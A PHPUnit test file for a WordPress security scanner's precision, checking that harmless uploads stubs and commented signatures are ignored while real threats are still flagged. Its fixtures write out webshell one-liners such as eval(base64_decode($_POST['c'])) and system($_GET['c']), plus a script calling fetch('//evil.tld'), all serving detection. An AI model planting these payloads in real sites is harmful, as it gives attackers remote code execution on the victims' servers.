<?php

namespace DeckWP\Connect\Tests\Unit;

use DeckWP\Connect\Scan\Scanner;
use PHPUnit\Framework\TestCase;

/**
 * What the scanner is allowed to call evidence.
 *
 * An end-to-end pass against a brand-new WordPress came back with three
 * findings, all false, and a scanner that cries wolf on a clean install
 * teaches the operator to dismiss it — which costs more than shipping no
 * scanner at all. Each test here pins one half of the distinction the
 * scanner has to make: a `.php` in uploads that cannot execute is not a
 * webshell, a signature quoted in a comment is not a backdoor, and a
 * permission bit the platform makes up is not a permission problem.
 *
 * The negative cases matter as much as the positives, so each fix is
 * tested in both directions: the file that should now be ignored, and
 * the very similar file that must still be reported.
 */
class ScannerPrecisionTest extends TestCase
{
    /** @var string */
    private $uploads;

    /** @var string */
    private $plugins;

    protected function setUp(): void
    {
        $this->uploads = WP_CONTENT_DIR . '/uploads';
        $this->plugins = WP_CONTENT_DIR . '/plugins';

        $this->rmrf(WP_CONTENT_DIR);
        mkdir($this->uploads, 0777, true);
        mkdir($this->plugins, 0777, true);
    }

    protected function tearDown(): void
    {
        $this->rmrf(WP_CONTENT_DIR);
    }

    /*
    |----------------------------------------------------------------
    | PHP in uploads
    |----------------------------------------------------------------
    */

    public function test_ignores_the_directory_listing_stub_deckwp_writes(): void
    {
        // Byte-for-byte what BackupManager::ensureBackupsDir() writes.
        // This exact file was reported as a critical webshell on a
        // WordPress that had never done anything except install DeckWP.
        $this->write('deckwp-backups/index.php', "<?php\n// Silence is golden.\n");

        $this->assertSame([], $this->findingsOfType('php_in_uploads'));
    }

    public function test_ignores_the_same_stub_wordpress_core_writes(): void
    {
        // Core omits the trailing newline; hosts and other plugins each
        // have their own dialect. Recognising them by content would mean
        // maintaining a list, so the rule is "contains no statement".
        $this->write('index.php', "<?php\n// Silence is golden.");
        $this->write('2026/08/index.php', "<?php // Silence is golden.");
        $this->write('woo-uploads/index.php', "<?php\n/**\n * Nothing here.\n */\n");

        $this->assertSame([], $this->findingsOfType('php_in_uploads'));
    }

    public function test_still_reports_a_webshell_in_uploads(): void
    {
        $this->write('2026/08/invoice.php', "<?php eval(base64_decode(\$_POST['c'])); ");

        $findings = $this->findingsOfType('php_in_uploads');

        $this->assertCount(1, $findings);
        $this->assertSame('critical', $findings[0]['severity']);
    }

    public function test_reports_a_stub_that_grew_one_statement(): void
    {
        // The interesting attack on an "is it inert?" check: pad a real
        // payload with enough comment to look like everyone else's
        // index.php. One statement is one too many.
        $this->write('deckwp-backups/index.php', "<?php\n// Silence is golden.\n@include('/tmp/x');\n");

        $this->assertCount(1, $this->findingsOfType('php_in_uploads'));
    }

    public function test_reports_markup_served_out_of_uploads(): void
    {
        // Everything before the close tag is inert; everything after it
        // is a page being served from the media directory.
        $this->write('promo.php', "<?php // nothing ?><script>fetch('//evil.tld')</script>");

        $this->assertCount(1, $this->findingsOfType('php_in_uploads'));
    }

    public function test_reports_a_php_file_it_cannot_parse(): void
    {
        // Fails closed. Broken PHP in the uploads directory is not the
        // place to extend the benefit of the doubt.
        $this->write('broken.php', '<?php function ( { ');

        $this->assertCount(1, $this->findingsOfType('php_in_uploads'));
    }

    /*
    |----------------------------------------------------------------
    | Obfuscation signatures
    |----------------------------------------------------------------
    */

    public function test_ignores_a_signature_quoted_in_a_docblock(): void
    {
        // This is the shape of the finding the scanner raised against
        // its own class docblock: a security plugin documenting what it
        // defends against, reported for describing it.
        $this->writePlugin('acme/acme.php', implode("\n", [
            '<?php',
            '/**',
            ' * Blocks the usual suspects, e.g. eval(base64_decode(...)).',
            ' */',
            'function acme_boot() { return true; }',
        ]));

        $this->assertSame([], $this->findingsOfType('eval_base64'));
    }

    public function test_ignores_a_signature_in_a_line_comment(): void
    {
        $this->writePlugin('acme/notes.php', implode("\n", [
            '<?php',
            '// TODO: also match eval( gzinflate( which we currently miss.',
            '$x = 1;',
        ]));

        $this->assertSame([], $this->findingsOfType('eval_gzinflate'));
    }

    public function test_still_reports_the_signature_in_executable_code(): void
    {
        $this->writePlugin('acme/hacked.php', implode("\n", [
            '<?php',
            '/* harmless docblock */',
            '$data = $_COOKIE["x"];',
            'eval(base64_decode($data));',
        ]));

        $findings = $this->findingsOfType('eval_base64');

        $this->assertCount(1, $findings);
        $this->assertSame('critical', $findings[0]['severity']);
        // Line 4, not line 2 — the comment scan must not shift the
        // reported location onto the first textual match.
        $this->assertSame(4, $findings[0]['line']);
        $this->assertStringContainsString('eval(base64_decode(', $findings[0]['evidence']);
    }

    public function test_reports_real_code_even_when_a_comment_matched_first(): void
    {
        // The regression the naive fix would introduce: stop at the
        // first match, see it is a comment, and clear the whole file.
        $this->writePlugin('acme/mixed.php', implode("\n", [
            '<?php',
            '// Scanner note: eval(base64_decode( is what we look for.',
            'eval(base64_decode($_GET["p"]));',
        ]));

        $findings = $this->findingsOfType('eval_base64');

        $this->assertCount(1, $findings);
        $this->assertSame(3, $findings[0]['line']);
    }

    public function test_reports_a_signature_in_a_file_that_does_not_parse(): void
    {
        // Fails closed, same reasoning as the uploads case: if the
        // tokeniser can't tell us where the comments are, we can't
        // claim the match was in one.
        $this->writePlugin('acme/garbled.php', "<?php eval(base64_decode(\$x  function ( {");

        $this->assertCount(1, $this->findingsOfType('eval_base64'));
    }

    /*
    |----------------------------------------------------------------
    | Every finding is actionable
    |----------------------------------------------------------------
    */

    public function test_every_finding_carries_a_path_relative_to_the_install(): void
    {
        // The dashboard renders `path` verbatim. A finding without one
        // is a number the operator can't act on, and an absolute one
        // leaks the host's directory layout into the panel.
        $this->write('2026/08/shell.php', '<?php system($_GET["c"]);');
        $this->writePlugin('acme/hacked.php', '<?php eval(str_rot13($_POST["z"]));');

        $findings = (new Scanner())->scan()['findings'];

        $this->assertNotEmpty($findings);
        foreach ($findings as $finding) {
            $this->assertArrayHasKey('path', $finding);
            $this->assertNotSame('', $finding['path']);
            $this->assertStringNotContainsString(rtrim(ABSPATH, '/\\'), $finding['path']);
        }
    }

    /*
    |----------------------------------------------------------------
    | wp-config permissions
    |----------------------------------------------------------------
    */

    public function test_permission_check_only_runs_where_permissions_mean_something(): void
    {
        // Windows synthesises the mode from the read-only attribute, so
        // fileperms() answers 0666 for every writable file — the
        // world-writable bit is set on every wp-config.php on every
        // Windows host, and the finding says nothing about that install.
        $config = ABSPATH . 'wp-config.php';
        file_put_contents($config, "<?php\n// test fixture\n");
        @chmod($config, 0666);

        try {
            $findings = $this->findingsOfType('world_writable_config');

            if (PHP_OS_FAMILY === 'Windows') {
                $this->assertSame([], $findings, 'Windows has no POSIX mode bits to report on.');
            } else {
                $this->assertCount(1, $findings, '0666 is world-writable and must still be reported on POSIX.');
                $this->assertSame('warning', $findings[0]['severity']);
            }
        } finally {
            @unlink($config);
        }
    }

    /*
    |----------------------------------------------------------------
    | Helpers
    |----------------------------------------------------------------
    */

    /** @return array<int, array<string, mixed>> */
    private function findingsOfType(string $type): array
    {
        $findings = (new Scanner())->scan()['findings'];

        return array_values(array_filter(
            $findings,
            static function (array $finding) use ($type): bool {
                return $finding['type'] === $type;
            }
        ));
    }

    private function write(string $relative, string $contents): void
    {
        $this->put($this->uploads . '/' . $relative, $contents);
    }

    private function writePlugin(string $relative, string $contents): void
    {
        $this->put($this->plugins . '/' . $relative, $contents);
    }

    private function put(string $path, string $contents): void
    {
        $dir = dirname($path);
        if (! is_dir($dir)) {
            mkdir($dir, 0777, true);
        }
        file_put_contents($path, $contents);
        // Windows occasionally hands back a file that isn't readable
        // yet on the very next call; clear the stat cache so the
        // scanner's filesize()/is_file() see what we just wrote.
        clearstatcache(true, $path);
    }

    private function rmrf(string $path): void
    {
        if (! is_dir($path)) {
            return;
        }
        $entries = scandir($path);
        foreach ($entries === false ? [] : $entries as $entry) {
            if ($entry === '.' || $entry === '..') {
                continue;
            }
            $full = $path . '/' . $entry;
            is_dir($full) && ! is_link($full) ? $this->rmrf($full) : @unlink($full);
        }
        @rmdir($path);
    }
}
